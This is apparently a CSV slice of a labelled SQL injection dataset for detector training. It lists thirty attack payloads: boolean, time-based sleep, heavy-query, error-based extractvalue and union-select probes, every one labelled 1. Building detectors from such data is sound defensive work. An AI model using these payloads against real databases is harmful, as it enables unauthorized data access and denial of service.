row_index,payload_norm,label,sqli_type_hint
7860,1 where 3956 = 3956,1,
7861,"1"" ) where 4971 = 4971 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
7862,"-3205"" ) union all select 5233,5233,5233,5233#",1,
7863,"1"" ) and 8677 = 9054#",1,
7864,"1"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""oyfz"" = ""oyfz",1,
7865,"1"" ) where 5870 = 5870 union all select null,null,null--",1,
7866,"1 where 7158 = 7158 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
7867,1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,1,
7868,"1"" ) where 2570 = 2570 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7869,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""yxes"" like ""yxes",1,
7870,"-4325' or make_set ( 9354 = 9354,7185 )",1,
7871,"1"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7872,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'cfhi' like 'cfhi",1,
7873,"1' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7874,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""xxug"" = ""xxug",1,
7875,"1"" order by 1#",1,
7876,"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #",1,
7877,1%' ) ) ) and 9198 = 9198--,1,
7878,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'zjun' = 'zjun,1,
7879,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
7880,"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7881,"1 ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
7882,"1%"" ) ) ) and 8438 = 7620--",1,
7883,1 and 7533 = 7533,1,
7884,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
7885,"1' where 6953 = 6953 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
7886,"-5198 ) ) ) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1,
7887,"1"" ) ) as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
7888,"1%' ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
7889,"1"" ) where 1144 = 1144 and 2006 = 2006",1,
